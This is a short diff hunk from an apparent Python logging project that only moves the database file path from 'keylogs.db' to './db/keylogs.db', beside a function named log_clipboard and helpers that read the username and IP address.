@@ -6,7 +6,7 @@ import shutil
 from directory import setup_user_directories
 from utils import get_username, get_ip
 
-DB_FILE = "keylogs.db"
+DB_FILE = "./db/keylogs.db"
 
 
 def log_clipboard(data):
